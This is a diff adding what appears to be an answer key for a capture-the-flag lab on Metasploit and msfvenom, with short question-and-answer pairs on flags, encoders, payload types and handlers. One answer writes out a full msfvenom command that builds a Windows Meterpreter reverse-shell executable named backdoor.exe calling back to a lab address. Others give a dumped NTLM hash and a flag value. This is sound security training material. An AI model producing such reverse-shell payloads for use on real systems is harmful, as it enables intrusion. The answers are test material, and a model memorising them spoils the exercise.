@@ -1,0 +1,30 @@
+What flag sets the output format in msfvenom?
+-f
+What flag specifies the payload to generate?
+-p
+
+Which payload type is self-contained and does not require a second download: staged or stageless?
+stageless
+
+What output format would you use to generate a Linux binary executable?
+elf
+Write the full msfvenom command to generate a stageless Windows x64 Meterpreter reverse TCP payload as an executable file named backdoor.exe, connecting back to 10.10.14.12 on port 5555.
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=5555 -f exe -o backdoor.exe
+
+What is the name of the most well-known Metasploit encoder?
+x86/shikata_ga_nai
+What msfvenom flag specifies characters that must not appear in the payload output?
+-b
+
+What msfvenom flag injects a payload into an existing executable template?
+-x
+
+What Metasploit module is used as a universal listener for catching reverse shell connections?
+exploit/multi/handler
+What handler option should you set to false if you want the handler to keep listening after the first session is established?
+ExitOnSession
+
+Use a post-exploitation module to dump the password hashes of other users on the system. What is jim's NTLM hash?
+1e3fe826df1e5af582a98c034cafa9f4
+Find the flag somewhere in C:\Users\Administrator. What's its value?
+THM{capst0ne_pwn3d_v1a_writable_share}
